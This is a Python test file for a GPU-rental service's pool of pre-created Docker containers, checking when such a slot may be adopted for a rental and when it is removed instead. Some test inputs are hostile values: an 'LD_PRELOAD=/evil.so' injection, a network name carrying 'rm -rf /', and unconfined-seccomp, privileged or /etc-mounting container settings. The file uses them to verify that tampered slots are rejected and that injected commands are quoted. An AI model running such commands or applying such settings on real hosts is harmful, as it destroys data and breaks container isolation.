    )
    svc.create_local_volume.assert_awaited_once()
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"
    assert (result.volume_limit_gb, result.storage_limit_gb) == (10, 20)


@pytest.mark.asyncio
async def test_slot_with_an_extra_tmpfs_is_not_adopted(svc, monkeypatch):
    """`--tmpfs /root` shadows the renter's volume at its data path and is recorded only in
    HostConfig.Tmpfs, not in `.Mounts` (taiberium, #1337): the slot is removed, the rental created."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    image = _image_doc()
    doc = _slot_doc(spec, image)
    doc["HostConfig"]["Tmpfs"] = {spec.volumes[0].target: "rw,size=1g"}
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    assert warm_pool.slot_matches(slot, spec, image) == "tmpfs or mount"
    ssh = _host(svc, spec, image, slot_doc=doc)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c for c in _cmds(ssh))
    assert any(f"docker rm -f {spec.name}" in c for c in _cmds(ssh))
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()


@pytest.mark.asyncio
async def test_miss_with_the_fast_path_on_probes_the_host_once_with_the_slot_listing_inside(
    svc, monkeypatch
):
    """With RENTAL_VOLUME_FAST_PATH_ENABLED (lium-io#1332) a miss still pays one host probe: the
    slot-volume listing is a section of that command, not a second round trip, and the slot's
    volume is out of the names the sizing will inspect."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    monkeypatch.setattr(ds_module.settings, "RENTAL_VOLUME_FAST_PATH_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    image = _image_doc()
    doc = _slot_doc(spec, image)
    doc["Config"]["Env"].append("LD_PRELOAD=/evil.so")
    ssh = _host(svc, spec, image, slot_doc=doc)
    host_side = ssh.run.side_effect

    def _side(cmd, *args, **kwargs):
        if "DockerRootDir" in cmd:  # the volume host probe; the host has the slot's volume and a pod's
            return _ssh_result(
                stdout=(
                    "ROOT\t/var/lib/docker\n"
                    "DF\tFilesystem 1-blocks Used Available Capacity Mounted on\r"
                    "/dev/vda1 1000 500 966367641600 80% /hostfs\r\n"
                    "VOL\tvolume_pod1\tvloopback:latest\n"
                    f"VOL\tvolume_{SLOT_ID}\tvloopback:latest\n"
                    "VOLS\t0\n"
                    f"SLOT\tvolume_{SLOT_ID}\n"
                    "PLUGIN\ttrue\n"
                )
            )
        return host_side(cmd, *args, **kwargs)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    probes = [c for c in _cmds(ssh) if "DockerRootDir" in c]
    assert len(probes) == 1
    assert warm_pool.slot_volumes_command(tag="SLOT") in probes[0]
    assert warm_pool.slot_volumes_command() not in _cmds(ssh)  # no separate slot listing
    probe = svc.resolve_volume_sizing.await_args.kwargs["host_probe"]
    assert probe.vloopback_volume_names == ["volume_pod1"]
    assert probe.warm_slot_volume_names == [f"volume_{SLOT_ID}"]
    assert svc.create_local_volume.await_args.kwargs["host_probe"] is probe


@pytest.mark.asyncio
async def test_failed_adopt_command_falls_back_and_removes_the_slot(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc(), adopt_exit=1)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    removed = [c for c in _cmds(ssh) if "docker rm -f" in c and f"volume_{SLOT_ID}" in c]
    assert any(f"pod_{payload.pod_id}" in c for c in removed) and any(
        spec.name in c for c in removed
    )
    svc.create_local_volume.assert_awaited_once()
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"


@pytest.mark.parametrize(
    "network_inspect",
    ["bridge|true\n", "bridge|\n", "macvlan|false\n", "", "a|false\nb|false\n"],
    ids=["icc-on", "icc-unset", "not-bridge", "no-such-network", "two-lines"],
)
@pytest.mark.asyncio
async def test_slot_is_not_started_on_a_network_that_lets_containers_talk(
    svc, monkeypatch, network_inspect
):
    """`docker create` refuses a `lium-rentals` that is not an ICC-off bridge (DAH-3199); a slot was
    created hours ago and only joins the network when it starts, so adoption re-reads the live
    network and falls back to a fresh create — which then refuses the same way."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc(), network_inspect=network_inspect)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    cmds = _cmds(ssh)
    assert warm_pool.inspect_network_command(spec.network) in cmds
    assert not any("docker rename" in c for c in cmds)
    assert any(f"docker rm -f {spec.name}" in c and f"volume rm volume_{SLOT_ID}" in c for c in cmds)
    svc.create_local_volume.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"


def test_network_mismatch_reads_the_inspect_line():
    assert warm_pool.network_mismatch("bridge|false\n") is None
    assert warm_pool.network_mismatch("bridge|true\n") == "network not an ICC-off bridge"
    assert warm_pool.network_mismatch("host|false\n") == "network not an ICC-off bridge"
    assert warm_pool.network_mismatch("") == "network not inspectable"
    assert "'lium-rentals; rm -rf /'" in warm_pool.inspect_network_command("lium-rentals; rm -rf /")
    assert 'index .Options "com.docker.network.bridge.enable_icc"' in warm_pool.inspect_network_command("n")


@pytest.mark.asyncio
async def test_partial_host_rental_never_asks_the_host(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload(disk_share=0.5)
    ssh = _host(svc, _spec(svc, payload), _image_doc())
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("__LIUM_WARM_POOL__" in c or "docker rename" in c for c in _cmds(ssh))
    svc.create_local_volume.assert_awaited_once()


@pytest.mark.asyncio
async def test_rental_with_a_port_the_slot_lacks_creates_fresh(svc, monkeypatch):
    """The rental's container ports come from generate_portMappings (the template's own ports,
    Jupyter, the preferred set); a slot that does not publish exactly those is not adopted."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc())
    _patch_happy(svc, monkeypatch, ssh)
    monkeypatch.setattr(
        svc,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 20001, 20001), (8000, 20002, 20002)], None)),
    )

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c for c in _cmds(ssh))
    svc.create_local_volume.assert_awaited_once()
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()
    assert result.port_maps == [(22, 20001), (8000, 20002)]
    lookup = next(p for p in result.profilers if p.name == ProfilerStepName.WARM_POOL_LOOKUP)
    assert lookup.skipped is True


@pytest.mark.asyncio
async def test_unreadable_slot_document_is_a_miss_not_a_failure(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    image = _image_doc()
    doc = _slot_doc(spec, image)
    doc["HostConfig"]["PortBindings"] = {"bad/tcp": [{"HostIp": "", "HostPort": "x"}]}
    ssh = _host(svc, spec, image, slot_doc=doc)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c for c in _cmds(ssh))
    svc.create_local_volume.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"


@pytest.mark.asyncio
async def test_sizing_leaves_slot_volumes_out_of_the_declared_sum(svc, monkeypatch):
    """A sparse slot volume declares a whole-host size and holds no bytes; counting it would inflate
    the pool every later sizing reconstructs."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    ssh = AsyncMock()

    def _side(cmd, *args, **kwargs):
        if "docker volume ls" in cmd:
            return _ssh_result(
                stdout="volume_pod1 vloopback:latest\nvolume_slot9 vloopback:latest\n"
            )
        if "lium.warm_pool=1" in cmd:
            return _ssh_result(stdout="volume_slot9\n")
        if "docker volume inspect" in cmd:
            assert "volume_slot9" not in cmd
            return _ssh_result(stdout="10g|10g\n")
        return _ssh_result()

    ssh.run = AsyncMock(side_effect=_side)
    assert await svc._get_existing_vloopback_bytes(ssh) == 10 * 1024**3

    # a listing that times out leaves the sum as it was before the pool: every volume counted
    def _side_every_volume(cmd, *args, **kwargs):
        if "lium.warm_pool=1" in cmd:
            raise TimeoutError("slot listing")
        if "docker volume inspect" in cmd:
            return _ssh_result(stdout="10g|10g\n20g|20g\n")
        return _side(cmd, *args, **kwargs)

    ssh.run = AsyncMock(side_effect=_side_every_volume)
    assert await svc._get_existing_vloopback_bytes(ssh) == 30 * 1024**3

    # With the flag off the sizing pays no listing round trip and counts every volume, as before the
    # pool; a slot left behind by a flag flip is the stale-container sweep's to remove.
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", False)
    ssh.run = AsyncMock(side_effect=_side_every_volume)
    assert await svc._get_existing_vloopback_bytes(ssh) == 30 * 1024**3
    assert not any("lium.warm_pool" in c.args[0] for c in ssh.run.await_args_list)


# ------------------------------------------------------------------
# leaving a slot behind a filler start
# ------------------------------------------------------------------


class _CreatingFakeClient:
    def __init__(self, inner):
        self._inner = inner
        self.created = []

    def __getattr__(self, name):
        return getattr(self._inner, name)

    async def create_container(self, spec, *, labels=None):
        self.created.append((spec, labels))


@pytest.mark.asyncio
async def test_filler_start_leaves_one_slot_per_prepulled_image(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    image = _image_doc()
    state = {
        "images": {
            IMAGE: {"last_pull_ok_at": "2026-09-09T01:00:00Z"},
            "daturaai/old:1": {"last_pull_ok_at": None},
        }
    }
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "cache_prefetch_state.json" in cmd:
            return _ssh_result(stdout=json.dumps(state))
        if "__LIUM_WARM_POOL__" in cmd:
            return _ssh_result(stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n")
        if "nvidia-smi --query-gpu=uuid" in cmd:
            return _ssh_result(stdout="GPU-aaaa\nGPU-bbbb\n")
        if "docker info" in cmd:
            return _ssh_result(
                stdout='{"runc":{"path":"runc"},"sysbox-runc":{"path":"/usr/bin/sysbox-runc"}}'
            )
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    client = _CreatingFakeClient(svc.rental_docker_client_factory.client)
    svc.rental_docker_client_factory.client = client
    monkeypatch.setattr(
        "services.docker_service.build_gpu_docker_config_for_executor",
        AsyncMock(return_value=build_gpu_docker_config(["GPU-aaaa", "GPU-bbbb"])),
    )
    filler = _payload(
        workload_kind=WorkloadKind.FILLER,
        docker_image="daturaai/empty-job:1.0.0",
        storage_limit_gb=20,
    )
    executor_info = _executor_info(filler)
    executor_info.port_range = "20000-20020"

    result = await svc.create_container(
        payload=filler,
        executor_info=executor_info,
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    assert isinstance(result, ContainerCreated)
    assert len(client.created) == 1
    spec, labels = client.created[0]
    assert spec.name.startswith("warm_") and spec.image == IMAGE
    assert (
        spec.command == ()
        and spec.entrypoint is None
        and spec.environment == {"NVIDIA_DRIVER_CAPABILITIES": "all"}
    )
    assert spec.runtime == "sysbox-runc"
    assert spec.cpu_count is None and spec.memory_gb is None
    assert [v.source for v in spec.volumes] == [f"volume_{spec.name.removeprefix('warm_')}"]
    assert sorted(spec.device_requests[0].device_ids) == ["GPU-aaaa", "GPU-bbbb"]
    # 22 + the ten preferred ports, bound to the top of the executor's range
    assert [p.container_port for p in spec.ports] == [22, *range(20000, 20010)]
    assert [p.host_port for p in spec.ports] == list(range(20010, 20021))
    assert labels["lium.warm_pool"] == "1" and labels["lium.warm_pool.volume_limit_gb"] == "10"
    volume_call = svc.create_local_volume.await_args
    assert (
        volume_call.kwargs["local_volume"] == spec.volumes[0].source
        and volume_call.kwargs["sparse"] is True
    )
    # the filler's own create ran untouched
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()


@pytest.mark.asyncio
async def test_filler_start_skips_images_that_already_have_a_slot_and_drops_stale_ones(
    svc, monkeypatch
):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    image = _image_doc()
    fresh = _slot_doc(_spec(svc, _adoptable_payload()), image)
    state = {"images": {IMAGE: {"last_pull_ok_at": "2026-09-09T01:00:00Z"}}}
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "cache_prefetch_state.json" in cmd:
            return _ssh_result(stdout=json.dumps(state))
        if "__LIUM_WARM_POOL__" in cmd:
            return _ssh_result(
                stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + json.dumps([fresh])
            )
        if "docker ps -a --filter label=lium.warm_pool=1" in cmd:
            return _ssh_result(
                stdout=f"warm_old\t{(datetime.now(UTC) - timedelta(hours=48)).isoformat()}\n"
            )
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    client = _CreatingFakeClient(svc.rental_docker_client_factory.client)
    svc.rental_docker_client_factory.client = client
    filler = _payload(workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0")

    result = await svc.create_container(
        payload=filler,
        executor_info=_executor_info(filler),
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    assert isinstance(result, ContainerCreated)
    assert client.created == []
    assert any("docker rm -f warm_old" in c and "volume rm volume_old" in c for c in _cmds(ssh))


@pytest.mark.asyncio
async def test_filler_start_maintains_the_pool_before_the_finished_stamp(svc, monkeypatch):
    """`FINISHED_IN_SUBNET` carries the wall-clock moment the backend measures its finalize span
    from (DAH-2458); the pool's seconds of maintenance run before that stamp, so they count as the
    subnet's own time and not as the finished-to-pending span."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    ssh = _ssh_client(inspect_exit=0)
    _patch_happy(svc, monkeypatch, ssh)
    maintained_at: list[int] = []

    async def _maintain(**kwargs):
        await asyncio.sleep(0.02)
        maintained_at.append(ds_module.now_ms())

    monkeypatch.setattr(svc, "_maintain_warm_pool", _maintain)
    filler = _payload(workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0")

    result = await svc.create_container(
        payload=filler,
        executor_info=_executor_info(filler),
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    assert isinstance(result, ContainerCreated)
    finished = next(p for p in result.profilers if p.name == ProfilerStepName.FINISHED_IN_SUBNET)
    assert maintained_at and finished.timestamp >= maintained_at[0]


@pytest.mark.asyncio
async def test_filler_start_with_the_flag_off_touches_no_pool(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", False)
    ssh = _ssh_client(inspect_exit=0)
    _patch_happy(svc, monkeypatch, ssh)
    filler = _payload(workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0")

    result = await svc.create_container(
        payload=filler,
        executor_info=_executor_info(filler),
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    assert isinstance(result, ContainerCreated)
    # no sweep, no prefetch-state read, no slot lookup: the pool is not maintained with the flag off
    assert warm_pool.list_slots_command() not in _cmds(ssh)
    assert not any("__LIUM_WARM_POOL__" in c or "cache_prefetch_state" in c for c in _cmds(ssh))


# ------------------------------------------------------------------
# what adoption must not break elsewhere
# ------------------------------------------------------------------


AGE_NOW = 1_800_000_000
ZERO_TIME_EPOCH = -62135596800  # docker's `0001-01-01T00:00:00Z` through `date +%s`


def _age_host(inspect_stdout: str):
    """An ssh client answering `date +%s` and the age inspect of `_get_container_age_minutes`."""
    ssh = AsyncMock()

    def _side(cmd, *args, **kwargs):
        if cmd.strip() == "date +%s":
            return _ssh_result(stdout=str(AGE_NOW))
        if "docker inspect" in cmd:
            return _ssh_result(stdout=inspect_stdout)
        return _ssh_result()

    ssh.run = AsyncMock(side_effect=_side)
    return ssh


@pytest.mark.asyncio
@pytest.mark.parametrize("flag_on", [False, True], ids=["flag-off", "flag-on"])
async def test_container_age_counts_from_the_last_start_while_never_restarted(monkeypatch, flag_on):
    """StaleContainerCleanupCheck ages a `pod_*` by this helper on EVERY validator; an adopted slot
    was created hours before the rental started it and must read as young as its start on each of
    them — a peer with the flag off reading `Created` alone would remove the live pod inside its
    rented-snapshot window — so the rule does not depend on the flag."""
    from services.container_cleanup import ContainerCleanup

    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", flag_on)
    ssh = _age_host(f"{AGE_NOW - 20 * 3600}\n{AGE_NOW - 30}\n0\n")
    age = await ContainerCleanup()._get_container_age_minutes(ssh, "pod_adopted")
    assert age is not None and age < 1
    (cmd,) = [c.args[0] for c in ssh.run.await_args_list if "docker inspect" in c.args[0]]
    assert ".Created" in cmd and ".State.StartedAt" in cmd and ".RestartCount" in cmd

    # a never-started container prints docker's zero time (a negative epoch): the create time wins
    ssh = _age_host(f"{AGE_NOW - 3600}\n{ZERO_TIME_EPOCH}\n0\n")
    assert await ContainerCleanup()._get_container_age_minutes(ssh, "warm_slot") == 60


@pytest.mark.asyncio
async def test_restarting_container_with_a_fresh_start_is_still_stale():
    """dockerd refreshes `StartedAt` on every restart-policy restart, so a crash-looping `pod_*`
    reads as seconds old for as long as it loops; its age must count from `Created`, or the stale
    sweep never removes it."""
    from services.container_cleanup import ContainerCleanup

    ssh = _age_host(f"{AGE_NOW - 20 * 3600}\n{AGE_NOW - 30}\n7\n")
    age = await ContainerCleanup()._get_container_age_minutes(ssh, "pod_crashlooping")
    assert age == 20 * 60


@pytest.mark.asyncio
async def test_a_short_or_garbled_age_inspect_reads_as_unknown():
    """One line, or a second inspect that printed an error, is `None` — the sweep leaves the
    container alone this pass, as it did before the pool on any unreadable age."""
    from services.container_cleanup import ContainerCleanup

    assert await ContainerCleanup()._get_container_age_minutes(_age_host(f"{AGE_NOW - 3600}\n"), "pod_x") is None
    garbled = _age_host(f"{AGE_NOW - 3600}\n{ZERO_TIME_EPOCH}\nError: No such object\n")
    assert await ContainerCleanup()._get_container_age_minutes(garbled, "pod_x") is None


@pytest.mark.asyncio
@pytest.mark.parametrize("flag_on", [False, True], ids=["flag-off", "flag-on"])
@pytest.mark.parametrize("age_hours, removed_names", [(1, []), (25, ["warm_left"])], ids=["fresh", "past-max-age"])
async def test_stale_sweep_ages_a_slot_by_the_pools_max_age_whatever_the_flag(
    monkeypatch, flag_on, age_hours, removed_names
):
    """`warm_` is a rental prefix, so a slot nobody adopted is the stale sweep's to remove — with its
    never-used volume, named like a pod's. Every validator sweeps every executor, so the age that
    decides is the pool's own WARM_POOL_MAX_AGE_HOURS on each of them: a peer applying the 15-minute
    rental grace would remove another validator's slots after every filler start, and a peer
    skipping `warm_*` would never remove one a flag flip left behind."""
    from services.container_cleanup import ContainerCleanup

    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", flag_on)
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_MAX_AGE_HOURS", 24)
    removed: list[str] = []

    def _side(cmd, *args, **kwargs):
        if "docker ps -a" in cmd:
            assert "warm_*" in cmd
            return _ssh_result(stdout="warm_left\n")
        if cmd.strip() == "date +%s":
            return _ssh_result(stdout=str(AGE_NOW))
        if "docker inspect" in cmd:
            return _ssh_result(stdout=f"{AGE_NOW - age_hours * 3600}\n{ZERO_TIME_EPOCH}\n0\n")
        if "docker rm -f" in cmd or "docker volume rm" in cmd:
            removed.append(cmd)
        return _ssh_result()

    ssh = AsyncMock()
    ssh.run = AsyncMock(side_effect=_side)
    count, names = await ContainerCleanup(stale_threshold_minutes=15).cleanup(
        ssh_client=ssh, rented_data=None, executor_uuid="exec-1"
    )
    assert (count, names) == (len(removed_names), removed_names)
    if removed_names:
        assert any("docker rm -fv warm_left" in c for c in removed)
        assert any("docker volume rm volume_left" in c for c in removed)
    else:
        assert removed == []


def test_preferred_ports_are_handed_out_as_a_copy(svc):
    ports = svc._get_preferred_ports(None)
    ports.insert(0, 22)
    assert 22 not in svc._get_preferred_ports(None)


@pytest.mark.asyncio
async def test_flag_off_volume_failure_is_still_reported_as_the_volume_step(svc, monkeypatch):
    """The volume stage moved into a helper; the failing step the backend sees must not change."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", False)
    ssh = _ssh_client(inspect_exit=0)
    _patch_happy(svc, monkeypatch, ssh)
    monkeypatch.setattr(svc, "create_local_volume", AsyncMock(side_effect=RuntimeError("no space")))

    result = await _run(svc, _adoptable_payload())

    assert isinstance(result, FailedContainerRequest)
    assert result.failure_step == "volume_creation"


@pytest.mark.parametrize(
    "mutate, expected",
    [
        (lambda d: d["HostConfig"].__setitem__("Privileged", True), "privileged"),
        (lambda d: d["HostConfig"].__setitem__("PidMode", "host"), "namespace mode"),
        (lambda d: d["HostConfig"].__setitem__("NetworkMode", "host"), "network"),
        # a slot on docker0 while rentals run on the ICC-off `lium-rentals` bridge (DAH-3199)
        (lambda d: d["HostConfig"].__setitem__("NetworkMode", "bridge"), "network"),
        (
            lambda d: d["HostConfig"].__setitem__("DeviceCgroupRules", ["a *:* rwm"]),
            "extra host config",
        ),
        (
            lambda d: d["HostConfig"].__setitem__("SecurityOpt", ["seccomp=unconfined"]),
            "extra host config",
        ),
        (lambda d: d["Config"].__setitem__("User", "0"), "user"),
        (
            lambda d: d["HostConfig"]["PortBindings"]["22/tcp"][0].__setitem__(
                "HostIp", "127.0.0.1"
            ),
            "port host ip",
        ),
        (lambda d: d["Mounts"][0].__setitem__("RW", False), "mount type"),
        (lambda d: d["HostConfig"].__setitem__("PublishAllPorts", True), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("ReadonlyRootfs", True), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("Init", True), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("CgroupParent", "/other"), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("Dns", ["10.0.0.1"]), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("DnsSearch", ["evil.example"]), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("OomScoreAdj", -1000), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("UTSMode", "host"), "namespace mode"),
        # `--tmpfs` lives only in HostConfig.Tmpfs, never in `.Mounts`; `--mount` in HostConfig.Mounts
        (lambda d: d["HostConfig"].__setitem__("Tmpfs", {"/root": ""}), "tmpfs or mount"),
        (
            lambda d: d["HostConfig"].__setitem__(
                "Mounts", [{"Type": "bind", "Source": "/etc", "Target": "/root"}]
            ),
            "tmpfs or mount",
        ),
        # cgroup limits `docker update --cpus/--memory` at adoption would leave in place
        (lambda d: d["HostConfig"].__setitem__("CpusetCpus", "0"), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("PidsLimit", 16), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("MemorySwap", 1 << 30), "extra host config"),
        (lambda d: d["HostConfig"].__setitem__("AutoRemove", True), "extra host config"),
        (
            lambda d: d["HostConfig"].__setitem__(
                "Annotations", {"org.systemd.property.CPUQuotaPerSecUSec": "uint64 100000"}
            ),
            "extra host config",
        ),
        (
            lambda d: d["Config"].__setitem__(
                "Healthcheck", {"Test": ["CMD-SHELL", "/opt/probe.sh"], "Interval": 5000000000}
            ),
            "healthcheck",
        ),
        (lambda d: d["Config"].__setitem__("WorkingDir", "/tmp"), "working dir"),
        (lambda d: d["Config"].__setitem__("StopSignal", "SIGKILL"), "stop signal"),
    ],
    ids=lambda v: v if isinstance(v, str) else "",
)
def test_host_config_the_spec_never_sets_must_be_at_the_defaults(svc, mutate, expected):
    spec = _spec(svc, _adoptable_payload())
    image = _image_doc()
    doc = _slot_doc(spec, image)
    mutate(doc)
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    assert slot is not None
    assert warm_pool.slot_matches(slot, spec, image) == expected


def test_external_volume_rental_is_blocked():
    payload = _adoptable_payload(
        external_volume_info=ExternalVolumeInfo(
            name="vol", plugin="s3", iam_user_access_key="k", iam_user_secret_key="s"
        )
    )
    assert (
        warm_pool.adopt_block_reason(
            payload, CustomOptions(), is_custom_build=False, image_managed_jupyter=False
        )
        == "external volume"
    )


@pytest.mark.asyncio
async def test_maintenance_removes_a_slot_whose_image_was_repulled_and_survives_a_create_failure(
    svc, monkeypatch
):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    image = _image_doc()
    stale = _slot_doc(_spec(svc, _adoptable_payload()), image)
    stale["Image"] = "sha256:" + "33" * 32  # the image was re-pulled since this slot was created
    state = {"images": {IMAGE: {"last_pull_ok_at": "2026-09-09T01:00:00Z"}}}
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "cache_prefetch_state.json" in cmd:
            return _ssh_result(stdout=json.dumps(state))
        if "__LIUM_WARM_POOL__" in cmd:
            return _ssh_result(
                stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + json.dumps([stale])
            )
        if "nvidia-smi --query-gpu=uuid" in cmd:
            return _ssh_result(stdout="GPU-aaaa\n")
        if "docker info" in cmd:
            return _ssh_result(stdout='{"runc":{"path":"runc"}}')
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    client = _CreatingFakeClient(svc.rental_docker_client_factory.client)

    async def _boom(spec, *, labels=None):
        raise RuntimeError("daemon busy")

    client.create_container = _boom
    svc.rental_docker_client_factory.client = client
    filler = _payload(
        workload_kind=WorkloadKind.FILLER,
        docker_image="daturaai/empty-job:1.0.0",
        storage_limit_gb=20,
    )
    executor_info = _executor_info(filler)
    executor_info.port_range = "20000-20020"

    result = await svc.create_container(
        payload=filler,
        executor_info=executor_info,
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    # the filler still came up; the stale slot went; the half-created slot's volume was removed
    assert isinstance(result, ContainerCreated)
    cmds = _cmds(ssh)
    assert any(f"docker rm -f {stale['Name'].lstrip('/')}" in c for c in cmds)
    created_volume = svc.create_local_volume.await_args.kwargs["local_volume"]
    assert any(f"volume rm {created_volume}" in c for c in cmds)


@pytest.mark.asyncio
async def test_maintenance_failure_never_fails_the_filler(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "lium.warm_pool" in cmd or "cache_prefetch_state" in cmd:
            raise TimeoutError("host hung")
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    filler = _payload(workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0")

    result = await svc.create_container(
        payload=filler,
        executor_info=_executor_info(filler),
        keypair=Mock(ss58_address="v"),
        private_key="encrypted",
    )

    assert isinstance(result, ContainerCreated)


# ------------------------------------------------------------------
# the slot the filler leaves must be the container a rental would create (host classes)
# ------------------------------------------------------------------

RDMA_NODES = ("/dev/infiniband/uverbs0", "/dev/infiniband/rdma_cm")


def _filler_host(svc, monkeypatch, *, gpu_uuids=("GPU-aaaa",), device_nodes=(), slots=(), sysbox=False):
    """A host with the pre-pull state naming IMAGE, `slots` as its created slots, and sysbox only when asked."""
    image = _image_doc()
    state = {"images": {IMAGE: {"last_pull_ok_at": "2026-09-09T01:00:00Z"}}}
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "cache_prefetch_state.json" in cmd:
            return _ssh_result(stdout=json.dumps(state))
        if "__LIUM_WARM_POOL__" in cmd:
            tail = json.dumps(list(slots)) if slots else ""
            return _ssh_result(stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + tail)
        if "nvidia-smi --query-gpu=uuid" in cmd:
            return _ssh_result(stdout="".join(f"{u}\n" for u in gpu_uuids))
        if "docker info" in cmd:
            runtimes = {"runc": {"path": "runc"}}
            if sysbox:
                runtimes["sysbox-runc"] = {"path": "/usr/bin/sysbox-runc"}
            return _ssh_result(stdout=json.dumps(runtimes))
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    client = _CreatingFakeClient(svc.rental_docker_client_factory.client)
    svc.rental_docker_client_factory.client = client
    monkeypatch.setattr(
        "services.docker_service.build_gpu_docker_config_for_executor",
        AsyncMock(return_value=build_gpu_docker_config(list(gpu_uuids), device_nodes=device_nodes)),
    )
    return ssh, client, image


async def _start_filler(svc, *, port_range="20000-20020", tdx_quote=None):
    filler = _payload(
        workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0", storage_limit_gb=20
    )
    executor_info = _executor_info(filler)
    executor_info.port_range = port_range
    if tdx_quote is not None:
        executor_info.tdx_quote = tdx_quote
    result = await svc.create_container(
        payload=filler, executor_info=executor_info, keypair=Mock(ss58_address="v"), private_key="encrypted"
    )
    assert isinstance(result, ContainerCreated)
    return filler


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "device_nodes, sysbox",
    [((), False), (RDMA_NODES, False), ((), True)],
